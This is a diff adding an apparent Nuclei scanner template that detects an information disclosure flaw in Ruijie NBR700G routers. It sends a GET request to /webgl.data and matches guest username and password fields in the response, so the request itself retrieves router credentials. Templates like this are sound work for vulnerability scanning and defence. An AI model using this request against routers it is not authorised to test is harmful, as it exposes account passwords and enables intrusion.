@@ -1,0 +1,30 @@
+id: ruijie-nbr-router-info-disclosure
+info:
+  name: Ruijie NBR Router Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Ruijie Network NBR700G router has an information disclosure vulnerability which can be exploited to obtain sensitive information such as the router account and password.
+  tags: information-disclosure
+  reference:
+    - https://afei00123.blog.csdn.net/
+http:
+  - raw:
+      - |
+        GET /webgl.data HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+        Accept: application/json, text/javascript, */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "http_guest_user"
+          - "http_guest_pwd"
+        part: body
